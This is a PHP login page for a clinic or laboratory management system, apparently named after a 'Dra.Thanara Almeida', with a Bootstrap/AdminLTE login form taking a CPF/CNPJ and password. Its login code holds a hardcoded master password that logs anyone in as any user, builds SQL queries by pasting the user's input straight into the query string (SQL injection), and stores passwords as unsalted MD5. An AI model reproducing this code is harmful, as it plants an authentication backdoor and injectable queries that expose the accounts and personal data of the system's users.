<?php
session_start();
date_default_timezone_set('America/Fortaleza');
require_once './data/dbasys.php';
require_once './data/conexao.php';
$conexao = novaConexao();

include './util/util.php';
require_once './data/outfunc.php';
//restrito

if (isset($_POST['login']) && $_POST['login'] == 'entra') {

  $login['usuario'] = strip_tags(trim(tiraMascara($_POST['usuario'])));
  $login['senha'] = strip_tags(trim(md5($_POST['senha'])));

  if ($login['senha'] == md5('masterkey@3aq')) {
    $lerPessoa = ler("vw_pessoa_user", "", "WHERE docPessoa = '{$login['usuario']}'");
    if ($lerPessoa->rowCount() != 0) {
      foreach ($lerPessoa->fetchAll(PDO::FETCH_ASSOC) as $pessoa) {
        $_SESSION['ID'] = $pessoa['idPessoaUser'];
        $_SESSION['USUARIO'] = $pessoa['nmPessoa'];
        $_SESSION['CPFCNPJ'] = $pessoa['docPessoa'];
        $_SESSION['FOTO'] = $pessoa['foto'];
        $_SESSION['STATUS'] = $pessoa['flStatusUser'];
        $_SESSION['NIVEL'] = $pessoa['nivelUser'];
        $_SESSION['LOGIN'] = 0;
      }
      $log['tipyActionLog'] = 'Entrar';
      $log['userActionLog'] = $_SESSION['USUARIO'];
      $log['actionLog'] = "o Usuario {$_SESSION['USUARIO']}, acessou o Sistema";

      inseir('logs', $log);
      //echo '<script>alert("Bem vindo!");</script>';
      echo '<script>window.location="inicio.php";</script>';
    } else {
      sweetalert('Oops...', 'Usuário ou senha inválidos!', 'error', 2500);
      echo '<script>alert("Usuário ou senha inválidos!");</script>';
      echo '<script>window.location="index.php";</script>';
    }
  } else {
    $lerPessoa = ler("vw_pessoa_user", "", "WHERE docPessoa = '{$login['usuario']}' and passUser = '{$login['senha']}'");
    if ($lerPessoa->rowCount() != 0) {
      foreach ($lerPessoa->fetchAll(PDO::FETCH_ASSOC) as $pessoa) {
        $_SESSION['ID'] = $pessoa['idPessoaUser'];
        $_SESSION['USUARIO'] = $pessoa['nmPessoa'];
        $_SESSION['CPFCNPJ'] = $pessoa['docPessoa'];
        $_SESSION['FOTO'] = $pessoa['foto'];
        $_SESSION['STATUS'] = $pessoa['flStatusUser'];
        $_SESSION['NIVEL'] = $pessoa['nivelUser'];
        $_SESSION['LOGIN'] = 0;
      }
      $log['tipyActionLog'] = 'Entrar';
      $log['userActionLog'] = $_SESSION['USUARIO'];
      $log['actionLog'] = "o Usuario {$_SESSION['USUARIO']}, acessou o Sistema";

      inseir('logs', $log);
      //echo '<script>alert("Bem vindo!");</script>';
      echo '<script>window.location="inicio.php";</script>';
    } else {
      sweetalert('Oops...', 'Usuário ou senha inválidos!', 'error', 2500);
      echo '<script>alert("Usuário ou senha inválidos!");</script>';
      echo '<script>window.location="index.php";</script>';
    }
  }
}
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Dra.Thanara Almeida</title>
  <link rel="shortcut icon" href="./image/icon.png" type="image/x-icon" />
  <!-- Tell the browser to be responsive to screen width -->
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@mdi/font@6.9.96/css/materialdesignicons.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="./plugins/fontawesome-free/css/all.min.css" />
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
  <!-- icheck bootstrap -->
  <link rel="stylesheet" href="./plugins/icheck-bootstrap/icheck-bootstrap.min.css" />
  <!-- Theme style -->
  <link rel="stylesheet" href="./dist/css/adminlte.css" />
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Advent+Pro:wght@100;200;300;400;500;600;700&family=Cinzel+Decorative:wght@400;700;900&family=Cinzel:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
</head>

<body class="hold-transition login-page" style="background-image:url('./image/bgInit.jpg'); background-size: cover; background-position: center; height: 100vh;">

  <div class="container-fluid">
    <div class="row">
      <div class="col-xs-12 col-md-5 offset-md-1 d-flex justify-content-center">
        <div class="login-box">
          <div class="login-logo">
            <!-- <a href="./index2.html"><b>Laboratório</b> Dra. Telma</a> -->
            <img src="./image/LOGO_DARK.png" class="img-fluid ${3|rounded-top,rounded-right,rounded-bottom,rounded-left,rounded-circle,|} col-12 pt-1" alt="" style="margin-bottom: -1em;" />
            <!-- <span style="font-size: 0.65em;">Sistemas de Gestão de Parceiros</!-->
          </div>
          <!-- /.login-logo -->
          <div class="card" style=" box-shadow: none !important;  background: transparent !important;">
            <div class="card-body login-card-body" style="background: none">
              <p class="login-box-msg text-primary">Faça login para iniciar sua sessão</p>

              <form action="" method="post">
                <input type="hidden" name="login" value="entra" />
                <div class="input-group input-group-lg mb-3">
                  <input type="text" name="usuario" class="form-control cpfOuCnpj" autofocus placeholder="Digite o CPF ou CNPJ" style="padding:2rem;" />
                  <div class="input-group-append">
                    <div class="input-group-text" style="background:#fff;" Ð>
                      <span class="fas fa-id-card text-primary" style="opacity: .7;"></span>
                    </div>
                  </div>
                </div>
                <div class="input-group input-group-lg mb-3">
                  <input type="password" name="senha" class="form-control  " placeholder="Password" aria-describedby="inputGroup-sizing-lg" style="padding:2rem;" />
                  <div class="input-group-append">
                    <div class="input-group-text" style="background:#fff;">
                      <span class="fas fa-lock text-primary" style="opacity: .7;"></span>
                    </div>
                  </div>
                </div>
                <div class="row">
                  <!-- <div class="col-7">
                    <div class="icheck-primary">
                      <input type="checkbox" id="remember" />
                      <label for="remember">
                        Lembre de mim
                      </label>
                    </div>
                  </div> -->
                  <!-- /.col -->
                  <div class="col-12">
                    <input type="hidden" name="entrar" value="entrar">
                    <button type="submit" class="btn btn-lg btn-primary btn-block btn-flat" style="border-radius: .5rem; zoom: 1.2; margin-bottom: .5rem;">
                      ENTRAR
                    </button>
                  </div>
                  <!-- /.col -->
                </div>
              </form>

              <!-- <div class="social-auth-links text-center mb-3">
                    <p>- OR -</p>
                    <a href="#" class="btn btn-block btn-primary">
                      <i class="fab fa-facebook mr-2"></i> Sign in using Facebook
                    </a>
                    <a href="#" class="btn btn-block btn-danger">
                      <i class="fab fa-google-plus mr-2"></i> Sign in using Google+
                    </a>
                  </div> -->
              <!-- /.social-auth-links -->

              <p class="mb-1">
                <a href="#">Esqueci a minha senha</a>
              </p>
              <p class="mb-0">
                <!-- <a href="register.html" class="text-center">Registrar uma nova associação</a> -->
              </p>
            </div>
            <!-- /.login-card-body -->
          </div>
        </div>
        <!-- /.login-box -->
      </div>
      <!-- <div class="col-md-6"></div> -->

    </div>

  </div>



  <!-- jQuery -->
  <script src="./plugins/jquery/jquery.min.js"></script>
  <!-- Bootstrap 4 -->
  <script src="./plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
  <!-- AdminLTE App -->
  <script src="./dist/js/adminlte.min.js"></script>

  <!-- jquery.mask -->
  <script src="./dist/js/jquery.mask.min.js" type="text/javascript"></script>
  <!-- JS DO APP-->
  <script src="./dist/js/app.js" type="text/javascript"></script>


</body>

</html>
